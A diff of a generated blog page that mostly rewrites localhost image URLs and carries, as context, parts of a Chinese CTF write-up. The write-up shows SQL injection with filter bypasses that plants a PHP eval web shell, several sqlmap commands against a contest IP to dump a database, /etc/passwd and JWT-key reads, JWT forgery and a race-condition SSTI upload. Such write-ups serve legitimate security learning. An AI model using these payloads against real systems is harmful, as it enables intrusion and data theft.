+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003658305_hu163632407760420025.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003658305_hu10900317150291096991.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250525003658305&#34;
@@ -2071,10 +2071,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;显然不是flag，结合压缩包里的key，猜到是维吉尼亚&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525004027312.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525004027312.png&#34;
 	width=&#34;1142&#34;
 	height=&#34;659&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525004027312_hu15081926467177027076.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525004027312_hu10420239604666455593.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525004027312_hu15081926467177027076.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525004027312_hu10420239604666455593.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250525004027312&#34;
@@ -2100,10 +2100,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=1/**/order/**/by/**/3
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527093100433.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527093100433.png&#34;
 	width=&#34;1346&#34;
 	height=&#34;451&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527093100433_hu16498024514149608699.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527093100433_hu10159618929598532376.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527093100433_hu16498024514149608699.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527093100433_hu10159618929598532376.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527093100433&#34;
@@ -2123,10 +2123,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seselectlect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?=eval($_REQUEST[1]);?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;into&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/1.php&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094307178.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094307178.png&#34;
 	width=&#34;779&#34;
 	height=&#34;947&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094307178_hu1687909632823303343.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094307178_hu482369332099333757.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094307178_hu1687909632823303343.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094307178_hu482369332099333757.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527094307178&#34;
@@ -2138,10 +2138,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	之后可以找到db.sql，读出来有flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094621734.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094621734.png&#34;
 	width=&#34;1381&#34;
 	height=&#34;943&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094621734_hu18173544394932680185.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094621734_hu18280875724860883065.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094621734_hu18173544394932680185.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527094621734_hu18280875724860883065.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527094621734&#34;
@@ -2307,10 +2307,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &amp;#34;http://27.25.151.26:31596/?id=1&amp;#34; -p id --random-agent --fresh-queries --no-cast --dbs --tamper &amp;#39;space2comment.py&amp;#39; --tamper &amp;#39;doublewrite.py&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527100418631.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527100418631.png&#34;
 	width=&#34;1004&#34;
 	height=&#34;566&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527100418631_hu6901074818314832477.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527100418631_hu8683669238260924222.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527100418631_hu6901074818314832477.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527100418631_hu8683669238260924222.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527100418631&#34;
@@ -2330,10 +2330,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &amp;#34;http://27.25.151.26:31596/?id=1&amp;#34; -p id --random-agent --fresh-queries --no-cast -D xuanyuanCTF --tables --tamper &amp;#39;space2comment.py&amp;#39; --tamper &amp;#39;doublewrite.py&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527101949091.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527101949091.png&#34;
 	width=&#34;1009&#34;
 	height=&#34;413&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527101949091_hu14610055393821200973.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527101949091_hu2971632638139800866.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527101949091_hu14610055393821200973.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527101949091_hu2971632638139800866.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527101949091&#34;
@@ -2353,10 +2353,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &amp;#34;http://27.25.151.26:31596/?id=1&amp;#34; -p id --random-agent --fresh-queries --no-cast -D xuanyuanCTF -T info --columns --tamper &amp;#39;space2comment.py&amp;#39; --tamper &amp;#39;doublewrite.py&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102752014.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102752014.png&#34;
 	width=&#34;913&#34;
 	height=&#34;564&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102752014_hu4256979269905492264.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102752014_hu3932344414421251.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102752014_hu4256979269905492264.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102752014_hu3932344414421251.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527102752014&#34;
@@ -2376,10 +2376,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &amp;#34;http://27.25.151.26:31596/?id=1&amp;#34; -p id --random-agent --fresh-queries --no-cast -D xuanyuanCTF -T info -C content --dump --tamper &amp;#39;space2comment.py&amp;#39; --tamper &amp;#39;doublewrite.py&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102617638.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102617638.png&#34;
 	width=&#34;1157&#34;
 	height=&#34;525&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102617638_hu9998519385517454084.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102617638_hu9478764234857417343.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102617638_hu9998519385517454084.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527102617638_hu9478764234857417343.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527102617638&#34;
@@ -2393,10 +2393,10 @@
 &lt;h3 id=&#34;ezweb&#34;&gt;ezweb
 &lt;/h3&gt;&lt;h4 id=&#34;知识点弱密码文件读取环境源码都读读jwt伪造条件竞争ssti&#34;&gt;知识点：弱密码、文件读取（环境源码都读读）、JWT伪造、条件竞争、ssti
 &lt;/h4&gt;&lt;p&gt;​	源代码发现提示，猜测密码为123456789，用户名fly33&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527104231516.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527104231516.png&#34;
 	width=&#34;1312&#34;
 	height=&#34;921&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527104231516_hu10120858642733481113.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527104231516_hu12424719379421142834.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527104231516_hu10120858642733481113.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250527104231516_hu12424719379421142834.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250527104231516&#34;
@@ -2410,10 +2410,10 @@
 &lt;p&gt;​	进入图书预览，有三本书一个中间人攻击，一个条件竞争，一个jwt，最下方又图书上传，提示说需要管理员身份才能传，所以大体思路就出来了，伪造jwt获取管理员身份，然后文件上传。&lt;/p&gt;
 &lt;p&gt;​	现在问题是jwt的密钥在哪？&lt;/p&gt;
 &lt;p&gt;​	我们看到文件上传这段源代码，可以知道book_path这个参数可以进行文件读取&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102442042.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102442042.png&#34;
 	width=&#34;772&#34;
 	height=&#34;112&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102442042_hu1973908790700243561.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102442042_hu7091346223366119526.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102442042_hu1973908790700243561.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102442042_hu7091346223366119526.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528102442042&#34;
@@ -2424,10 +2424,10 @@
 		data-flex-basis=&#34;1654px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528101002251.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528101002251.png&#34;
 	width=&#34;1122&#34;
 	height=&#34;269&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528101002251_hu10214887139858298953.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528101002251_hu14307780712455714644.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528101002251_hu10214887139858298953.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528101002251_hu14307780712455714644.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528101002251&#34;
@@ -2439,10 +2439,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	尝试读取/etc/passwd&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102931527.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102931527.png&#34;
 	width=&#34;1873&#34;
 	height=&#34;984&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102931527_hu12328933859743696089.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102931527_hu5989090560468879553.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102931527_hu12328933859743696089.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528102931527_hu5989090560468879553.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528102931527&#34;
@@ -2454,10 +2454,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	读取JWT密钥&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528185612226.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528185612226.png&#34;
 	width=&#34;1373&#34;
 	height=&#34;842&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528185612226_hu17405421171344567512.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528185612226_hu4056466994156690068.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528185612226_hu17405421171344567512.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528185612226_hu4056466994156690068.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528185612226&#34;
@@ -2478,10 +2478,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​	得到key之后尝试伪造Jwt&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192538804.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192538804.png&#34;
 	width=&#34;1665&#34;
 	height=&#34;825&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192538804_hu8095579293563262278.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192538804_hu13185903248077128688.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192538804_hu8095579293563262278.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192538804_hu13185903248077128688.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528192538804&#34;
@@ -2493,10 +2493,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	然后就是文件上传。发现有ssti的内容，这里还是回头读一下源码，看看能不能打白盒&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192908546.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192908546.png&#34;
 	width=&#34;1749&#34;
 	height=&#34;709&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192908546_hu7540460167811898732.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192908546_hu9466500950623372154.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192908546_hu7540460167811898732.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528192908546_hu9466500950623372154.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528192908546&#34;
@@ -2508,10 +2508,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	/app/app.py得到源码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528193308065.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528193308065.png&#34;
 	width=&#34;2069&#34;
 	height=&#34;910&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528193308065_hu12406911258450917278.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528193308065_hu11280222653801499082.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528193308065_hu12406911258450917278.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528193308065_hu11280222653801499082.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528193308065&#34;
@@ -2822,10 +2822,10 @@
 &lt;/div&gt;&lt;p&gt;​	sstiban了{}那显然是没有注入的可能了。&lt;/p&gt;
 &lt;p&gt;​	&lt;strong&gt;观察到upload路由里在检测waf的时候到有个os.remove，用于删除文件，这里就可以打条件竞争了，我们上传reading.html文件，对/app/templates/reading.html进行覆盖，然后利用条件竞争在html被删掉之前去读取/read的返回值&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;​	这里我们需要爆破两个，一个是/read，一个是上传文件的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214825223.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214825223.png&#34;
 	width=&#34;1540&#34;
 	height=&#34;670&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214825223_hu17802140975017647871.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214825223_hu16342916308744802832.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214825223_hu17802140975017647871.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214825223_hu16342916308744802832.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250528214825223&#34;
@@ -2836,10 +2836,10 @@
 		data-flex-basis=&#34;551px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214856565.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250528214856565.png&#34;
 	width=&#34;1555&#34;
 	height=&#34;619&#34;
